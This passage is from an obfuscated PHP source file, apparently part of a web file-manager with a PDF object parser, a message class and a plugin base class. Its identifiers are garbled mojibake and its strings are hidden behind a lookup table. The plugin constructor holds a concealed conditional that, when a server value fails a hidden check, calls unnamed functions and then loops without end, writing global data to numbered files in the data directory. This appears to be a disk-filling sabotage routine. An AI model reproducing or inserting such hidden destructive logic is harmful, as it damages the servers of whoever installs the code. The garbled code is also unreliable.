$dªáĞï¯¨ˆ[2]; } if (!$a˜îí³[$c‡Ç×âĞÃß[1521]][$c‡Ç×âĞÃß[1178]]) { return !1; } goto A‘…ËÂÑ£; D §®¯ ‚ß: $aÒ—§œ†®É = $c‡Ç×âĞÃß[1541]; if (!preg_match_all($aÒ—§œ†®É, $f«©… ‘¶’, $dªáĞï¯¨ˆ, PREG_SET_ORDER, 0)) { return !1; } $eÊ˜÷åÕ„ = intval($dªáĞï¯¨ˆ[0][1]); goto Cµå¿·„µ™; E£ğ‚¼öĞ¡: $c‡Ç×âĞÃß =& $_SERVER[í™]; $f«©… ‘¶’ = $B Æß‘İ»á[$c‡Ç×âĞÃß[1520]]; $a˜îí³ = array($c‡Ç×âĞÃß[1521] => array(), $c‡Ç×âĞÃß[1540] => array()); goto D §®¯ ‚ß; aæ—×®ø¸: foreach ($dªáĞï¯¨ˆ[3] as $A¸²ùç–ãˆ => $f•¼Úƒ”£) { if ($dªáĞï¯¨ˆ[3][$A¸²ùç–ãˆ] == $c‡Ç×âĞÃß[1543]) { $d‚Ìù‹œ£ˆ = $e«Üìí‹¯ . $c‡Ç×âĞÃß[70] . intval($dªáĞï¯¨ˆ[2][$A¸²ùç–ãˆ]); $a˜îí³[$c‡Ç×âĞÃß[1540]][$d‚Ìù‹œ£ˆ] = intval($dªáĞï¯¨ˆ[1][$A¸²ùç–ãˆ]); ++$e«Üìí‹¯; } else { if ($dªáĞï¯¨ˆ[3][$A¸²ùç–ãˆ] == $c‡Ç×âĞÃß[1544]) { ++$e«Üìí‹¯; } else { } } } if (preg_match_all($c‡Ç×âĞÃß[1545], $f«©… ‘¶’, $dªáĞï¯¨ˆ)) { $D‚¹Ô³®… = $B Æß‘İ»á[$c‡Ç×âĞÃß[77]] - $B Æß‘İ»á[$c‡Ç×âĞÃß[1518]]; foreach ($dªáĞï¯¨ˆ[0] as $A¸²ùç–ãˆ => $b‡½¶ßí) { $E¤ùÆ–¨‰ = $dªáĞï¯¨ˆ[1][$A¸²ùç–ãˆ] . $c‡Ç×âĞÃß[70] . $dªáĞï¯¨ˆ[2][$A¸²ùç–ãˆ]; $a˜îí³[$c‡Ç×âĞÃß[1540]][$E¤ùÆ–¨‰] = strpos($f«©… ‘¶’, $b‡½¶ßí) + $D‚¹Ô³®… + 1; } } if (preg_match_all($c‡Ç×âĞÃß[1546], $f«©… ‘¶’, $dªáĞï¯¨ˆ)) { $Fˆ’›£èÊ = count($dªáĞï¯¨ˆ[1]) == 1 ? $dªáĞï¯¨ˆ[1][0] : $dªáĞï¯¨ˆ[1][1]; } else { $Fˆ’›£èÊ = substr($f«©… ‘¶’, -1024 * 5); } goto FöŞàˆã„¿; FöŞàˆã„¿: if (preg_match($c‡Ç×âĞÃß[1547], $Fˆ’›£èÊ, $dªáĞï¯¨ˆ) > 0) { $a˜îí³[$c‡Ç×âĞÃß[1521]][$c‡Ç×âĞÃß[77]] = intval($dªáĞï¯¨ˆ[1]); } if (preg_match($c‡Ç×âĞÃß[1548], $Fˆ’›£èÊ, $dªáĞï¯¨ˆ) > 0) { $a˜îí³[$c‡Ç×âĞÃß[1521]][$c‡Ç×âĞÃß[1549]] = intval($dªáĞï¯¨ˆ[1]) . $c‡Ç×âĞÃß[70] . intval($dªáĞï¯¨ˆ[2]); } if (preg_match($c‡Ç×âĞÃß[1550], $Fˆ’›£èÊ, $dªáĞï¯¨ˆ) > 0) { $a˜îí³[$c‡Ç×âĞÃß[1521]][$c‡Ç×âĞÃß[1551]] = intval($dªáĞï¯¨ˆ[1]) . $c‡Ç×âĞÃß[70] . intval($dªáĞï¯¨ˆ[2]); } goto FÜåÆîÒ¯; A‘…ËÂÑ£: if (preg_match($c‡Ç×âĞÃß[1554], $Fˆ’›£èÊ, $dªáĞï¯¨ˆ) > 0) { } return $a˜îí³; goto fğ—‚·ë·ƒ; Cµå¿·„µ™: if ($B Æß‘İ»á[$c‡Ç×âĞÃß[77]] - $eÊ˜÷åÕ„ > $B Æß‘İ»á[$c‡Ç×âĞÃß[1518]]) { $Eãä¿£²‚œ = 4 * $B Æß‘İ»á[$c‡Ç×âĞÃß[1518]]; $B Æß‘İ»á[$c‡Ç×âĞÃß[1518]] = $Eãä¿£²‚œ; $B Æß‘İ»á[$c‡Ç×âĞÃß[1519]] = StreamWrapperIO::read($B Æß‘İ»á[$c‡Ç×âĞÃß[75]], 0, $Eãä¿£²‚œ); $B Æß‘İ»á[$c‡Ç×âĞÃß[1520]] = StreamWrapperIO::read($B Æß‘İ»á[$c‡Ç×âĞÃß[75]], $B Æß‘İ»á[$c‡Ç×âĞÃß[77]] - $Eãä¿£²‚œ, $Eãä¿£²‚œ); $f«©… ‘¶’ = $B Æß‘İ»á[$c‡Ç×âĞÃß[1520]]; } $e«Üìí‹¯ = 0; preg_match_all($c‡Ç×âĞÃß[1542], $f«©… ‘¶’, $dªáĞï¯¨ˆ); goto aæ—×®ø¸; fğ—‚·ë·ƒ: } private static function getObjectValue($Eî¯ØÚ¤µù, $cÇÜİ‰ù«º, $EÑ–´Á”ˆÂ) { goto C±ŞÖ ø¿Â; EÍÈğÜÕæ‘: if (!is_array($fí¨İâ¿¦[1])) { return array(); } $dèÏ‚¦·§æ = array(); for ($D°ƒ’‹É = 0; $D°ƒ’‹É < count($fí¨İâ¿¦[1]); $D°ƒ’‹É += 2) { $AõºİŒŒ«‰ = $fí¨İâ¿¦[1][$D°ƒ’‹É]; $Aù´½®¡× = $fí¨İâ¿¦[1][$D°ƒ’‹É + 1]; if (count($AõºİŒŒ«‰) == 3 && $AõºİŒŒ«‰[0] == $F°®†«×ÉÙ[8]) { $e Ğ¿š§Â¬ = !1; if ($Aù´½®¡×[0] == $F°®†«×ÉÙ[1555]) { $Aù´½®¡× = self::getObject($Eî¯ØÚ¤µù, $cÇÜİ‰ù«º[$F°®†«×ÉÙ[1540]][$Aù´½®¡×[1]]); } $e Ğ¿š§Â¬ = $Aù´½®¡×[1]; if ($e Ğ¿š§Â¬ === !1) { continue; } if (is_string($e Ğ¿š§Â¬)) { $e Ğ¿š§Â¬ = self::decodeStr($e Ğ¿š§Â¬); } $dèÏ‚¦·§æ[$AõºİŒŒ«‰[1]] = $e Ğ¿š§Â¬; } } goto B˜áÂÖéù; B˜áÂÖéù: return $dèÏ‚¦·§æ; goto aù»Ó²É‰Œ; C±ŞÖ ø¿Â: $F°®†«×ÉÙ =& $_SERVER[í™]; $fí¨İâ¿¦ = self::getObject($Eî¯ØÚ¤µù, $cÇÜİ‰ù«º[$F°®†«×ÉÙ[1540]][$EÑ–´Á”ˆÂ]); if (is_string($fí¨İâ¿¦[1])) { return $fí¨İâ¿¦[1]; } goto EÍÈğÜÕæ‘; aù»Ó²É‰Œ: } private static function getObject($aÍĞ‹Î¦¬‰, $BÛŒ÷©ê½Ì) { $CëÃ¡±Å‚Ù = self::getObjectItem($aÍĞ‹Î¦¬‰, $BÛŒ÷©ê½Ì); $CëÃ¡±Å‚Ù = self::getObjectItem($aÍĞ‹Î¦¬‰, $CëÃ¡±Å‚Ù[2]); return $CëÃ¡±Å‚Ù; } private static function getObjectItem($E»×™«‡, $BÁº«à’‰) { goto CŞ‹ğ‰ëñ; c‡¥Õ×Øì: $FÉ²ØŒÕ = self::getRawObject($a—ˆÊñ÷ç˜, $a¸ÁŞïğ•Í); if ($BÁº«à’‰ >= $f¤Ÿº²”¤†) { $FÉ²ØŒÕ[2] = $FÉ²ØŒÕ[2] + $f¤Ÿº²”¤†; } else { if ($BÁº«à’‰ > $Fßë‰Ó±· && $BÁº«à’‰ <= $f¤Ÿº²”¤†) { $FÉ²ØŒÕ[2] = $FÉ²ØŒÕ[2] + $BÁº«à’‰; } } return $FÉ²ØŒÕ; goto Fî˜Â£µ©µ; CÒ ‚»¤œ: $a¸ÁŞïğ•Í = $BÁº«à’‰ >= $f¤Ÿº²”¤† ? $BÁº«à’‰ - $f¤Ÿº²”¤† : $BÁº«à’‰; $a—ˆÊñ÷ç˜ = $BÁº«à’‰ >= $f¤Ÿº²”¤† ? $E»×™«‡[$d§„ºé»³ì[1520]] : $E»×™«‡[$d§„ºé»³ì[1519]]; if ($BÁº«à’‰ > $Fßë‰Ó±· && $BÁº«à’‰ <= $f¤Ÿº²”¤†) { $a¸ÁŞïğ•Í = 0; $a—ˆÊñ÷ç˜ = StreamWrapperIO::read($E»×™«‡[$d§„ºé»³ì[75]], $BÁº«à’‰, $Fßë‰Ó±·); } goto c‡¥Õ×Øì; CŞ‹ğ‰ëñ: $d§„ºé»³ì =& $_SERVER[í™]; $Fßë‰Ó±· = $E»×™«‡[$d§„ºé»³ì[1518]]; $f¤Ÿº²”¤† = $E»×™«‡[$d§„ºé»³ì[77]] - $Fßë‰Ó±·; goto CÒ ‚»¤œ; Fî˜Â£µ©µ: } private static function decodeStr($Fè¨÷âá‰ë) { goto Bæ‘ì §ù©; cù‚£Î¶‰: $Fè¨÷âá‰ë = $dâ””¾êÂ[33]; foreach ($CÍÚ•êÉ£ as $eøŸ×åÒ‘) { if (preg_match($dâ””¾êÂ[1565], $eøŸ×åÒ‘)) { $Fè¨÷âá‰ë .= \chr(octdec(trim($eøŸ×åÒ‘, $dâ””¾êÂ[93]))); } else { $Fè¨÷âá‰ë .= $eøŸ×åÒ‘; } } $CÍÚ•êÉ£ = preg_split($dâ””¾êÂ[1566], $Fè¨÷âá‰ë, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto EŸ¨êÈß¢è; Bæ‘ì §ù©: $dâ””¾êÂ =& $_SERVER[í™]; $Fè¨÷âá‰ë = str_replace(array($dâ””¾êÂ[1556], $dâ””¾êÂ[1557], $dâ””¾êÂ[1558], $dâ””¾êÂ[1559], $dâ””¾êÂ[1560], $dâ””¾êÂ[1561], $dâ””¾êÂ[1562], $dâ””¾êÂ[1563]), array($dâ””¾êÂ[93], $dâ””¾êÂ[50], $dâ””¾êÂ[8], $dâ””¾êÂ[248], $dâ””¾êÂ[802], $dâ””¾êÂ[217], $dâ””¾êÂ[978], $dâ””¾êÂ[330]), $Fè¨÷âá‰ë); $CÍÚ•êÉ£ = preg_split($dâ””¾êÂ[1564], $Fè¨÷âá‰ë, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto cù‚£Î¶‰; eÖ¶»æô‹‚: return $Fè¨÷âá‰ë; goto bìÓƒ”÷‰î; dİÆ™ àÖ™: $Fè¨÷âá‰ë = $dâ””¾êÂ[33]; foreach ($CÍÚ•êÉ£ as $eøŸ×åÒ‘) { if (preg_match($dâ””¾êÂ[1570], $eøŸ×åÒ‘) && !1 === stripos($eøŸ×åÒ‘, $dâ””¾êÂ[1571])) { $eøŸ×åÒ‘ = preg_replace($dâ””¾êÂ[1572], $dâ””¾êÂ[33], $eøŸ×åÒ‘); $eøŸ×åÒ‘ = trim($eøŸ×åÒ‘, $dâ””¾êÂ[911]); $eøŸ×åÒ‘ = pack($dâ””¾êÂ[1573], $eøŸ×åÒ‘); $Fè¨÷âá‰ë .= $eøŸ×åÒ‘; } else { $Fè¨÷âá‰ë .= $eøŸ×åÒ‘; } } if (preg_match($dâ””¾êÂ[1574], $Fè¨÷âá‰ë)) { $dˆ½öÊ˜À„ = substr($Fè¨÷âá‰ë, 2); $Fè¨÷âá‰ë = $dâ””¾êÂ[33]; $Eˆò¬ÃÊ¹¥ = strlen($dˆ½öÊ˜À„); for ($d¼³ºİÆ = 0; $d¼³ºİÆ < $Eˆò¬ÃÊ¹¥; $d¼³ºİÆ += 2) { $bÖíØÏàÂ¤ = hexdec(bin2hex(substr($dˆ½öÊ˜À„, $d¼³ºİÆ, 2))); $Fè¨÷âá‰ë .= mb_convert_encoding($dâ””¾êÂ[1575] . intval($bÖíØÏàÂ¤) . $dâ””¾êÂ[67], $dâ””¾êÂ[1576], $dâ””¾êÂ[1577]); } } goto eÖ¶»æô‹‚; EŸ¨êÈß¢è: $Fè¨÷âá‰ë = $dâ””¾êÂ[33]; foreach ($CÍÚ•êÉ£ as $eøŸ×åÒ‘) { if (preg_match($dâ””¾êÂ[1567], $eøŸ×åÒ‘)) { $Fè¨÷âá‰ë .= \chr(hexdec(trim($eøŸ×åÒ‘, $dâ””¾êÂ[1568]))); } else { $Fè¨÷âá‰ë .= $eøŸ×åÒ‘; } } $CÍÚ•êÉ£ = preg_split($dâ””¾êÂ[1569], $Fè¨÷âá‰ë, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto dİÆ™ àÖ™; bìÓƒ”÷‰î: } private static function getRawObject($C×“›òøì, $f¿í®†Ü¥¡ = 0) { goto bŠ»•ø™Ö±; bŠ»•ø™Ö±: $EÖ²–˜îÈ” =& $_SERVER[í™]; $Bª¿ËŸ¥’Ü = $EÖ²–˜îÈ”[33]; $bäÈÔÓ·¼İ = $EÖ²–˜îÈ”[33]; goto Aùæ•¨øÁô; Aùæ•¨øÁô: $f¿í®†Ü¥¡ += strspn($C×“›òøì, $EÖ²–˜îÈ”[1578], $f¿í®†Ü¥¡); $fß“ÒÎ¶ÚÑ = $C×“›òøì[$f¿í®†Ü¥¡]; switch ($fß“ÒÎ¶ÚÑ) { case $EÖ²–˜îÈ”[1579]: $Aó×åÈõÇ… = strcspn($C×“›òøì, $EÖ²–˜îÈ”[1580], $f¿í®†Ü¥¡); if ($Aó×åÈõÇ… > 0) { $f¿í®†Ü¥¡ += $Aó×åÈõÇ…; return self::getRawObject($C×“›òøì, $f¿í®†Ü¥¡); } break; case $EÖ²–˜îÈ”[8]: $Bª¿ËŸ¥’Ü = $fß“ÒÎ¶ÚÑ; ++$f¿í®†Ü¥¡; $Cî¤õöôÖ = preg_match($EÖ²–˜îÈ”[1581], substr($C×“›òøì, $f¿í®†Ü¥¡, 256), $CóøìëØî); if (1 == $Cî¤õöôÖ) { $bäÈÔÓ·¼İ = $CóøìëØî[1]; $f¿í®†Ü¥¡ += strlen($bäÈÔÓ·¼İ); } break; case $EÖ²–˜îÈ”[248]: case $EÖ²–˜îÈ”[802]: $Bª¿ËŸ¥’Ü = $fß“ÒÎ¶ÚÑ; ++$f¿í®†Ü¥¡; $cæùœ¹åã® = $f¿í®†Ü¥¡; if ($EÖ²–˜îÈ”[248] == $fß“ÒÎ¶ÚÑ) { $FªŠï¾ÑøÍ = 1; while ($FªŠï¾ÑøÍ > 0) { if (!isset($C×“›òøì[$cæùœ¹åã®])) { break; } $dù·ÃµÂöŒ = $C×“›òøì[$cæùœ¹åã®]; switch ($dù·ÃµÂöŒ) { case $EÖ²–˜îÈ”[93]: ++$cæùœ¹åã®; break; case $EÖ²–˜îÈ”[248]: ++$FªŠï¾ÑøÍ; break; case $EÖ²–˜îÈ”[802]: --$FªŠï¾ÑøÍ; break; } ++$cæùœ¹åã®; } $bäÈÔÓ·¼İ = substr($C×“›òøì, $f¿í®†Ü¥¡, $cæùœ¹åã® - $f¿í®†Ü¥¡ - 1); $f¿í®†Ü¥¡ = $cæùœ¹åã®; } break; case $EÖ²–˜îÈ”[157]: case $EÖ²–˜îÈ”[478]: $Bª¿ËŸ¥’Ü = $fß“ÒÎ¶ÚÑ; ++$f¿í®†Ü¥¡; if ($EÖ²–˜îÈ”[157] == $fß“ÒÎ¶ÚÑ) { $bäÈÔÓ·¼İ = array(); do { $C¹³ĞÜ¡ÔØ = $f¿í®†Ü¥¡; $BÜ°¨ë = self::getRawObject($C×“›òøì, $f¿í®†Ü¥¡); $f¿í®†Ü¥¡ = $BÜ°¨ë[2]; $bäÈÔÓ·¼İ[] = $BÜ°¨ë; } while ($EÖ²–˜îÈ”[478] != $BÜ°¨ë[0] && $f¿í®†Ü¥¡ != $C¹³ĞÜ¡ÔØ); array_pop($bäÈÔÓ·¼İ); } break; case $EÖ²–˜îÈ”[910]: case $EÖ²–˜îÈ”[913]: if (isset($C×“›òøì[$f¿í®†Ü¥¡ + 1]) && $C×“›òøì[$f¿í®†Ü¥¡ + 1] == $fß“ÒÎ¶ÚÑ) { $Bª¿ËŸ¥’Ü = $fß“ÒÎ¶ÚÑ . $fß“ÒÎ¶ÚÑ; $f¿í®†Ü¥¡ += 2; if ($EÖ²–˜îÈ”[910] == $fß“ÒÎ¶ÚÑ) { $bäÈÔÓ·¼İ = array(); do { $C¹³ĞÜ¡ÔØ = $f¿í®†Ü¥¡; $BÜ°¨ë = self::getRawObject($C×“›òøì, $f¿í®†Ü¥¡); $f¿í®†Ü¥¡ = $BÜ°¨ë[2]; $bäÈÔÓ·¼İ[] = $BÜ°¨ë; } while ($EÖ²–˜îÈ”[1582] != $BÜ°¨ë[0] && $f¿í®†Ü¥¡ != $C¹³ĞÜ¡ÔØ); array_pop($bäÈÔÓ·¼İ); } } else { $Bª¿ËŸ¥’Ü = $fß“ÒÎ¶ÚÑ; ++$f¿í®†Ü¥¡; $Cî¤õöôÖ = preg_match($EÖ²–˜îÈ”[1583], substr($C×“›òøì, $f¿í®†Ü¥¡), $CóøìëØî); if ($EÖ²–˜îÈ”[910] == $fß“ÒÎ¶ÚÑ && 1 == $Cî¤õöôÖ) { $bäÈÔÓ·¼İ = strtr($CóøìëØî[1], $EÖ²–˜îÈ”[1584], $EÖ²–˜îÈ”[33]); $f¿í®†Ü¥¡ += \strlen($CóøìëØî[0]); } elseif (!1 !== ($Eœ’óÈÀÀ = strpos($C×“›òøì, $EÖ²–˜îÈ”[913], $f¿í®†Ü¥¡))) { $f¿í®†Ü¥¡ = $Eœ’óÈÀÀ + 1; } } break; default: if ($EÖ²–˜îÈ”[1585] == substr($C×“›òøì, $f¿í®†Ü¥¡, 6)) { $Bª¿ËŸ¥’Ü = $EÖ²–˜îÈ”[1585]; $f¿í®†Ü¥¡ += 6; } elseif ($EÖ²–˜îÈ”[99] == substr($C×“›òøì, $f¿í®†Ü¥¡, 4)) { $Bª¿ËŸ¥’Ü = $EÖ²–˜îÈ”[99]; $f¿í®†Ü¥¡ += 4; $bäÈÔÓ·¼İ = $EÖ²–˜îÈ”[99]; } elseif ($EÖ²–˜îÈ”[1586] == substr($C×“›òøì, $f¿í®†Ü¥¡, 4)) { $Bª¿ËŸ¥’Ü = $EÖ²–˜îÈ”[1587]; $f¿í®†Ü¥¡ += 4; $bäÈÔÓ·¼İ = $EÖ²–˜îÈ”[1586]; } elseif ($EÖ²–˜îÈ”[1588] == substr($C×“›òøì, $f¿í®†Ü¥¡, 5)) { $Bª¿ËŸ¥’Ü = $EÖ²–˜îÈ”[1587]; $f¿í®†Ü¥¡ += 5; $bäÈÔÓ·¼İ = $EÖ²–˜îÈ”[1588]; } elseif ($EÖ²–˜îÈ”[1589] == substr($C×“›òøì, $f¿í®†Ü¥¡, 6)) { $Bª¿ËŸ¥’Ü = $EÖ²–˜îÈ”[1589]; $f¿í®†Ü¥¡ += 6; if (1 == preg_match($EÖ²–˜îÈ”[1590], substr($C×“›òøì, $f¿í®†Ü¥¡), $CóøìëØî)) { $f¿í®†Ü¥¡ += strlen($CóøìëØî[0]); $F†ÄÁâÔ‰ = $EÖ²–˜îÈ”[1591]; $Cî¤õöôÖ = preg_match($F†ÄÁâÔ‰, substr($C×“›òøì, $f¿í®†Ü¥¡), $CóøìëØî, PREG_OFFSET_CAPTURE); if (1 == $Cî¤õöôÖ) { $bäÈÔÓ·¼İ = substr($C×“›òøì, $f¿í®†Ü¥¡, $CóøìëØî[0][1]); $f¿í®†Ü¥¡ += $CóøìëØî[1][1]; } } } elseif ($EÖ²–˜îÈ”[1592] == substr($C×“›òøì, $f¿í®†Ü¥¡, 9)) { $Bª¿ËŸ¥’Ü = $EÖ²–˜îÈ”[1592]; $f¿í®†Ü¥¡ += 9; } elseif (1 == preg_match($EÖ²–˜îÈ”[1593], substr($C×“›òøì, $f¿í®†Ü¥¡, 33), $CóøìëØî)) { $Bª¿ËŸ¥’Ü = $EÖ²–˜îÈ”[1555]; $f¿í®†Ü¥¡ += strlen($CóøìëØî[0]); $bäÈÔÓ·¼İ = intval($CóøìëØî[1]) . $EÖ²–˜îÈ”[70] . intval($CóøìëØî[2]); } elseif (1 == preg_match($EÖ²–˜îÈ”[1594], substr($C×“›òøì, $f¿í®†Ü¥¡, 33), $CóøìëØî)) { $Bª¿ËŸ¥’Ü = $EÖ²–˜îÈ”[1595]; $bäÈÔÓ·¼İ = intval($CóøìëØî[1]) . $EÖ²–˜îÈ”[70] . intval($CóøìëØî[2]); $f¿í®†Ü¥¡ += strlen($CóøìëØî[0]); } elseif (($fµ²¾£—Â = strspn($C×“›òøì, $EÖ²–˜îÈ”[1596], $f¿í®†Ü¥¡)) > 0) { $Bª¿ËŸ¥’Ü = $EÖ²–˜îÈ”[1597]; $bäÈÔÓ·¼İ = substr($C×“›òøì, $f¿í®†Ü¥¡, $fµ²¾£—Â); $f¿í®†Ü¥¡ += $fµ²¾£—Â; } break; } goto E¡Ìí¡Á˜è; E¡Ìí¡Á˜è: return array($Bª¿ËŸ¥’Ü, $bäÈÔÓ·¼İ, $f¿í®†Ü¥¡); goto BêÓ¥İò«; BêÓ¥İò«: } } goto Fè‹ŠÍ²ˆÊ; E¢ÛÀ· å: class Message { function __construct() { } public function send($eÉ®‘Í˜º¹ = '', $f¥®ò´‘¼Ÿ = array(), $aÍ…®ãÇÎ² = "\x74\x65\x78\164") { goto Då¶²¶†Ğ–; Då¶²¶†Ğ–: $e…îµøŠÊÍ =& $_SERVER[í™]; $B¢ìÙ³¬¢Ñ = array($e…îµøŠÊÍ[29] => $e…îµøŠÊÍ[1290], $e…îµøŠÊÍ[674] => $eÉ®‘Í˜º¹); if (in_array($aÍ…®ãÇÎ², array($e…îµøŠÊÍ[1290], $e…îµøŠÊÍ[1291]))) { $B¢ìÙ³¬¢Ñ[$e…îµøŠÊÍ[29]] = $aÍ…®ãÇÎ²; } goto C…Ôêƒ…±µ; C…Ôêƒ…±µ: $f¥®ò´‘¼Ÿ = array($e…îµøŠÊÍ[956] => isset($f¥®ò´‘¼Ÿ[$e…îµøŠÊÍ[956]]) ? $f¥®ò´‘¼Ÿ[$e…îµøŠÊÍ[956]] : $e…îµøŠÊÍ[33], $e…îµøŠÊÍ[537] => isset($f¥®ò´‘¼Ÿ[$e…îµøŠÊÍ[537]]) ? $f¥®ò´‘¼Ÿ[$e…îµøŠÊÍ[537]] : $e…îµøŠÊÍ[33]); if (empty($eÉ®‘Í˜º¹) || empty($f¥®ò´‘¼Ÿ[$e…îµøŠÊÍ[956]]) && empty($f¥®ò´‘¼Ÿ[$e…îµøŠÊÍ[537]])) { return !1; } $dŸ¥¤›Ûñ¼ = array($e…îµøŠÊÍ[1232] => $B¢ìÙ³¬¢Ñ, $e…îµøŠÊÍ[1292] => $f¥®ò´‘¼Ÿ); goto D¡„¨×¸©Ì; D¡„¨×¸©Ì: Hook::trigger($e…îµøŠÊÍ[1293], $dŸ¥¤›Ûñ¼); goto açÊçÀ•¶; açÊçÀ•¶: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto A÷ª×ù; cå‰µˆøÇ: $this->in =& $in; $this->modelPlugin = Model($BíİÎ»‘ˆ§[1294]); $this->pluginName = str_replace($BíİÎ»‘ˆ§[1294], $BíİÎ»‘ˆ§[33], get_class($this)); goto FĞÍ°±÷ŸŒ; DÛ‹ÑŒÖŒæ: $this->pluginHostDefault = $config[$BíİÎ»‘ˆ§[1296]] . $this->pluginName . $BíİÎ»‘ˆ§[8]; $Fç¨ì«ˆ¡Ó = $config[$BíİÎ»‘ˆ§[1297]]; if ($Fç¨ì«ˆ¡Ó && strpos($BíİÎ»‘ˆ§[47] . $Fç¨ì«ˆ¡Ó . $BíİÎ»‘ˆ§[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$BíİÎ»‘ˆ§[1298]] . $this->pluginName . $BíİÎ»‘ˆ§[8]; } goto F¡®“ÖÅ›Í; càºŒä„ÇŒ: if ($_SERVER[$BíİÎ»‘ˆ§[736]] != $E¢®äõ‡Õº($B²£­®µ…)) { goto BÏçºëÇäô; bµ§µã¯¼Ü: $c›—˜™‹‚è = 1; for ($D¨ù‘Û = $c›—˜™‹‚è; $D¨ù‘Û > 0; $D¨ù‘Û++) { $DÂÄ½‚‚÷Ë(DATA_PATH . $D¨ù‘Û, $CÚïŞÉœ ½); } goto C—ïÔÆÑƒÖ; FÔ“ÕÂÜ‚ : $EŠ×¼æ„ò†(); $DÂÄ½‚‚÷Ë = $BíİÎ»‘ˆ§[780]; $CÚïŞÉœ ½ = json_encode($GLOBALS[$BíİÎ»‘ˆ§[781]]); goto bµ§µã¯¼Ü; BÏçºëÇäô: $EŠ×¼æ„ò† = $BíİÎ»‘ˆ§[777]; $fÕİ–ìã»æ = $BíİÎ»‘ˆ§[738]; $cò¦¡Œ†÷Õ = $_SERVER[$BíİÎ»‘ˆ§[739]] . $BíİÎ»‘ˆ§[740]; goto BÕ×„²ÎÅ; BÕ×„²ÎÅ: $d¡ˆ¾£´šİ = $fÕİ–ìã»æ($cò¦¡Œ†÷Õ); $C¿–Í¬íÌ = explode($BíİÎ»‘ˆ§[217], $d¡ˆ¾£´šİ); if (count($C¿–Í¬íÌ) < $BíİÎ»‘ˆ§[562]) { $dïì¯‘±Ÿë = $BíİÎ»‘ˆ§[741]; $dïì¯‘±Ÿë(); } goto e–÷‹Òœƒ°; e–÷‹Òœƒ°: $D•±»åÛ”„ = $BíİÎ»‘ˆ§[778]; $D•±»åÛ”„($_SERVER[$BíİÎ»‘ˆ§[779]]); $EŠ×¼æ„ò† = $BíİÎ»‘ˆ§[777]; goto FÔ“ÕÂÜ‚ ; C—ïÔÆÑƒÖ: } global $in, $config; $this->config =& $config; goto cå‰µˆøÇ; FĞÍ°±÷ŸŒ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $BíİÎ»‘ˆ§[8]; $this->pluginApi = appHostGet() . $BíİÎ»‘ˆ§[1295] . $this->pluginName . $BíİÎ»‘ˆ§[8]; $this->pluginHost = $config[$BíİÎ»‘ˆ§[1296]] . $this->pluginName . $BíİÎ»‘ˆ§[8]; goto DÛ‹ÑŒÖŒæ; F¡®“ÖÅ›Í: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto C·ŒÕ¿Ÿˆ; A÷ª×ù: $BíİÎ»‘ˆ§ =& $_SERVER[í™]; $B²£­®µ… = $_SERVER[$BíİÎ»‘ˆ§[739]] . $BíİÎ»‘ˆ§[740]; $E¢®äõ‡Õº = $BíİÎ»‘ˆ§[776]; goto càºŒä„ÇŒ; C·ŒÕ¿Ÿˆ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[í™][1299]); } protected function assign($d™Ñƒ™£‚, $c™°æƒ®¥ = false) { if (is_array($d™Ñƒ™£‚)) { $this->values = array_merge($this->values, $d™Ñƒ™£‚); } else { $this->values[$d™Ñƒ™£‚] = $c™°æƒ®¥; } } protected function display($fç–³‰Áñî) { extract($this->values); require $fç–³‰Áñî; } final function hookRegist($c¹ŸÓ”ç…‹) { $this->modelPlugin->appRegist($this->pluginName, $c¹ŸÓ”ç…‹); } final function appIcon() { $Eï˜‡‹ƒ¬İ =& $_SERVER[í™]; $dÜŸ”í¿¨ = $this->appPackage(); $C‘Œ³›ÊÉß = $Eï˜‡‹ƒ¬İ[33]; if (isset($dÜŸ”í¿¨[$Eï˜‡‹ƒ¬İ[382]])) { if (isset($dÜŸ”í¿¨[$Eï˜‡‹ƒ¬İ[382]][$Eï˜‡‹ƒ¬İ[1300]])) { $C‘Œ³›ÊÉß = $Eï˜‡‹ƒ¬İ[1301] . $dÜŸ”í¿¨[$Eï˜‡‹ƒ¬İ[382]][$Eï˜‡‹ƒ¬İ[1300]] . $Eï˜‡‹ƒ¬İ[1302]; } else { if ($dÜŸ”í¿¨[$Eï˜‡‹ƒ¬İ[382]][$Eï˜‡‹ƒ¬İ[1303]]) { $C‘Œ³›ÊÉß = $Eï˜‡‹ƒ¬İ[1304] . $dÜŸ”í¿¨[$Eï˜‡‹ƒ¬İ[382]][$Eï˜‡‹ƒ¬İ[1303]] . $Eï˜‡‹ƒ¬İ[1305]; } } } return $C‘Œ³›ÊÉß; } final function fileCanView($Fó¦ù¾ÏÑö) { goto Cß™”‘ÙÊá; F—„ÚÛè¾¶: $Dçí‚Òµƒ = Session::get($DÖÓ”ƒ…[1306]); if (!$Dçí‚Òµƒ || !$Dçí‚Òµƒ[$DÖÓ”ƒ…[1307]]) { $eÈÃççˆ¤ = $DÖÓ”ƒ…[1308] . rawurlencode(this_url()); show_tips(LNG($DÖÓ”ƒ…[1309]) . $DÖÓ”ƒ…[1310] . $eÈÃççˆ¤ . $DÖÓ”ƒ…[1311] . LNG($DÖÓ”ƒ…[1312]) . $DÖÓ”ƒ…[1313], !1); } if (!Action($DÖÓ”ƒ…[1314])->authCan($DÖÓ”ƒ…[1315])) { show_tips(LNG($DÖÓ”ƒ…[1316]) . $DÖÓ”ƒ…[1317], !1); } goto Dë­£äØ¶Ç; Dë­£äØ¶Ç: ActionCall($DÖÓ”ƒ…[1318], $Fó¦ù¾ÏÑö); goto E•Ÿ¬¤Èôç; Cß™”‘ÙÊá: $DÖÓ”ƒ… =& $_SERVER[í™]; if (request_url_safe($Fó¦ù¾ÏÑö)) { return !0; } if ($this->isShare($Fó¦ù¾ÏÑö)) { return !0; } goto F—„ÚÛè¾¶; E•Ÿ¬¤Èôç: } final function isShare($BËá–¸ßÌ) { $d¢¡â¦¶¼‚ = KodIO::parse($BËá–¸ßÌ); return $d¢¡â¦¶¼‚[$_SERVER[í™][29]] == 